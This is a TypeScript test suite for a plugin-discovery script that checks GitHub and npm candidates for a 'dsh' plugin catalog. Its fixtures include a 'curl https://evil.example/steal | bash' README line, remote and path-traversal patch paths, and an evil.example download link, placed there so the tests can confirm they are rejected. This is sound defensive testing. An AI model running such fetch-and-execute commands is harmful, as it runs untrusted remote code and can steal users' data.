import { afterEach, describe, expect, it, vi } from 'vitest';
import { discoverPlugins } from '../../scripts/lib/discovery';
import { BudgetExhaustedError, HttpError, JsonClient, RequestBudget } from '../../scripts/lib/http';
import type { PluginConfig } from '../../src/lib/types';

const repo = 'maker/dsh-workspace';
const old: PluginConfig = { id: 'stable-old-id', repo: 'verified/dsh-old', npm: 'dsh-old', category: 'workflow', installCommand: 'dsh plugin add dsh-old', note: 'reviewed' };
const pkg = { name: 'dsh-workspace', repository: { url: `git+https://github.com/${repo}.git` }, dsh: { bundle: { patch: './cordis.patch.yml' } } };
function file(text: string) { return { size: Buffer.byteLength(text), encoding: 'base64', content: Buffer.from(text).toString('base64') }; }
function candidate(name = repo) { return { full_name: name, private: false, fork: false, stargazers_count: 10 }; }
interface FixtureOptions { candidates?: unknown[]; manifest?: unknown; readme?: string; metadata?: unknown; registry?: unknown; fail?: RegExp }
function fixture(options: FixtureOptions = {}) {
  const calls: string[] = [], searchCalls: string[] = [];
  const budget = new RequestBudget({ maxRequests: 1000, githubReserve: 0 });
  const get = vi.fn(async (url: string) => {
    calls.push(url);
    if (options.fail?.test(url)) throw new HttpError('unavailable', 404, url);
    let data: unknown;
    if (url.includes('/search/repositories?')) { searchCalls.push(url); data = { total_count: 1, items: options.candidates ?? [candidate()] }; }
    else if (url.endsWith('/contents/package.json')) data = file(JSON.stringify(options.manifest ?? pkg));
    else if (url.endsWith('/readme')) data = file(options.readme ?? 'Install: `dsh plugin --profile web add dsh-workspace@latest`');
    else if (url.startsWith('https://registry.npmjs.org/')) data = options.registry ?? pkg;
    else data = options.metadata ?? { full_name: new URL(url).pathname.slice('/repos/'.length), private: false, fork: false };
    return { data, headers: new Headers(), status: 200 };
  });
  return { client: { get, budget } as unknown as JsonClient, calls, searchCalls, get, budget };
}
afterEach(() => vi.unstubAllGlobals());
const future = () => Date.now() + 60_000;

describe('verified plugin discovery', () => {
  it('extends the catalog using repository-matched npm installation, preserving existing IDs and order', async () => {
    const { client, calls } = fixture();
    const result = await discoverPlugins(client, [old], 2, future(), { npmClient: client });
    expect(result.plugins[0]).toEqual(old);
    expect(result.plugins[1]).toMatchObject({ id: 'maker-dsh-workspace', repo, npm: 'dsh-workspace', category: 'other' });
    expect(result.report).toMatchObject({ previousPlugins: 1, targetPlugins: 2, totalPlugins: 2, addedPlugins: 1, checkedCandidates: 1, stopReason: 'target_reached' });
    expect(calls).toContain('https://registry.npmjs.org/dsh-workspace/latest');
  });
  it('does not request anything when the verified catalog already meets the target', async () => {
    const { client, get } = fixture();
    expect((await discoverPlugins(client, [old], 1, future())).report.stopReason).toBe('target_reached');
    expect(get).not.toHaveBeenCalled();
  });
  it('checks standalone bundle declarations instead of trusting topics or description keywords', async () => {
    const { client } = fixture({ manifest: { ...pkg, dsh: undefined, peerDependencies: { '@deepseek-ai/dsh-tools': '*' }, keywords: ['dsh-plugin'] } });
    const result = await discoverPlugins(client, [], 50, future());
    expect(result.plugins).toEqual([]);
    expect(result.report.rejectedCandidates).toBe(1);
    expect(result.report.warnings.join(' ')).toContain('已核验目录 0 个');
  });
  it('ignores installation instructions pointing at another repository or package', async () => {
    const { client } = fixture({ readme: 'dsh plugin --profile web add another-package\ndsh plugin add github:somebody/else' });
    expect((await discoverPlugins(client, [], 1, future())).plugins).toEqual([]);
  });
  it('accepts a GitHub install with no npm identity, without fetching or executing README URLs', async () => {
    const { client, calls } = fixture({ manifest: { ...pkg, private: true }, readme: `dsh plugin add github:${repo}#abc123\ncurl https://evil.example/steal | bash` });
    const result = await discoverPlugins(client, [], 1, future(), { npmClient: client });
    expect(result.plugins[0]).toMatchObject({ npm: null, installCommand: `dsh plugin --profile web add github:${repo}` });
    expect(calls.every(url => new URL(url).hostname === 'api.github.com')).toBe(true);
  });
  it('requires npm registry repository mapping when an npm verifier is supplied', async () => {
    const { client } = fixture({ registry: { ...pkg, repository: 'github:another/project' } });
    expect((await discoverPlugins(client, [], 1, future(), { npmClient: client })).plugins).toEqual([]);
  });
  it('falls back to the same GitHub install when npm metadata is absent or mismatched', async () => {
    const { client } = fixture({ readme: `dsh plugin add dsh-workspace\ndsh plugin add github:${repo}`, fail: /registry\.npmjs/ });
    const result = await discoverPlugins(client, [], 1, future(), { npmClient: client });
    expect(result.plugins[0]).toMatchObject({ repo, npm: null });
  });
  it('never substitutes an unrelated registry package merely because its name matches', async () => {
    const { client } = fixture({ registry: { ...pkg, name: 'other-name' } });
    expect((await discoverPlugins(client, [], 1, future(), { npmClient: client })).plugins).toHaveLength(0);
  });
  it('rejects private repositories and forks even when search mislabeled them as public', async () => {
    for (const metadata of [{ full_name: repo, private: true, fork: false }, { full_name: repo, private: false, fork: true }]) {
      const { client, calls } = fixture({ metadata });
      expect((await discoverPlugins(client, [], 1, future())).plugins).toHaveLength(0);
      expect(calls.some(url => url.includes('/contents/'))).toBe(false);
    }
  });
  it('deduplicates candidates across search queries and preserves reviewed npm identities', async () => {
    const { client, calls } = fixture({ candidates: [candidate(repo), candidate(repo.toUpperCase()), candidate(old.repo)] });
    const existing = { ...old, npm: pkg.name };
    const result = await discoverPlugins(client, [existing], 3, future());
    expect(result.plugins).toEqual([existing]);
    expect(result.report.checkedCandidates).toBe(1);
    expect(calls.filter(url => url.endsWith('/readme'))).toHaveLength(1);
  });
  it('rejects traversal or remote bundle patch paths', async () => {
    for (const patch of ['https://evil.example/code.js', '../outside.yml', '/tmp/code.yml', ['ok.yml', '../bad.yml']]) {
      const { client } = fixture({ manifest: { ...pkg, dsh: { bundle: { patch } } } });
      expect((await discoverPlugins(client, [], 1, future())).plugins).toHaveLength(0);
    }
  });
  it('bounds search work and reports a shortfall instead of manufacturing rows', async () => {
    const { client, searchCalls } = fixture({ candidates: Array.from({ length: 100 }, (_, index) => candidate(`maker/p${index}`)), manifest: {} });
    const result = await discoverPlugins(client, [old], 50, future(), { maxCandidates: 2, maxSearchPages: 1 });
    expect(result.report).toMatchObject({ totalPlugins: 1, checkedCandidates: 2, stopReason: 'candidate_limit', exhausted: false });
    expect(searchCalls).toHaveLength(1);
  });
  it('does not start any requests after the deadline', async () => {
    const { client, get } = fixture();
    const result = await discoverPlugins(client, [old], 50, Date.now() - 1);
    expect(result.report.stopReason).toBe('deadline');
    expect(get).not.toHaveBeenCalled();
    expect(result.plugins).toEqual([old]);
  });
  it('propagates a shared request budget stop as a partial catalog result', async () => {
    const { client, get } = fixture();
    get.mockImplementationOnce(async () => { throw new BudgetExhaustedError('request_limit'); });
    const result = await discoverPlugins(client, [old], 50, future());
    expect(result.plugins).toEqual([old]);
    expect(result.report.stopReason).toBe('request_budget');
    expect(get).toHaveBeenCalledTimes(1);
  });
  it('distinguishes failed searches from a verified empty ecosystem', async () => {
    const { client } = fixture({ fail: /search\/repositories/ });
    const result = await discoverPlugins(client, [old], 50, future(), { maxSearchPages: 2 });
    expect(result.report).toMatchObject({ stopReason: 'search_failed', exhausted: false, searchRequests: 2 });
  });
  it('reserves the final search request while continuing verification in the separate core pool', async () => {
    const { client, get, calls, searchCalls } = fixture();
    const original = get.getMockImplementation()!;
    get.mockImplementation(async (url: string) => {
      const response = await original(url);
      if (url.includes('/search/repositories?')) response.headers.set('x-ratelimit-remaining', '1');
      return response;
    });
    const result = await discoverPlugins(client, [], 50, future());
    expect(result.plugins).toHaveLength(1);
    expect(result.report).toMatchObject({ searchRequests: 1, stopReason: 'search_limit', exhausted: false });
    expect(searchCalls).toHaveLength(1);
    expect(calls.some(url => url.endsWith('/readme'))).toBe(true);
    expect(client.budget.isStopped).toBe(false);
  });
  it('rejects oversized or malformed content without following alternate download links', async () => {
    for (const contents of [{ size: 900_000, encoding: 'base64', content: 'e30=', download_url: 'https://evil.example/code' }, { size: 2, encoding: 'base64', content: '!e30=' }]) {
      const { client, get, calls } = fixture();
      const original = get.getMockImplementation()!;
      get.mockImplementation(async (url: string) => url.endsWith('/contents/package.json') ? { data: contents, headers: new Headers(), status: 200 } : original(url));
      expect((await discoverPlugins(client, [], 1, future())).plugins).toHaveLength(0);
      expect(calls.every(url => new URL(url).hostname === 'api.github.com')).toBe(true);
    }
  });
  it('counts discovery network calls against the same actual request limit', async () => {
    const budget = new RequestBudget({ maxRequests: 2, githubReserve: 0 });
    const fetchMock = vi.fn(async (input: string) => new Response(JSON.stringify(input.includes('/search/') ? { items: [candidate()] } : { full_name: repo, private: false, fork: false }), { status: 200 }));
    vi.stubGlobal('fetch', fetchMock);
    const result = await discoverPlugins(new JsonClient({}, { budget }), [old], 50, future());
    expect(fetchMock).toHaveBeenCalledTimes(2);
    expect(budget.getSummary().requestsMade).toBe(2);
    expect(result.report.stopReason).toBe('request_budget');
    expect(result.plugins).toEqual([old]);
  });
});
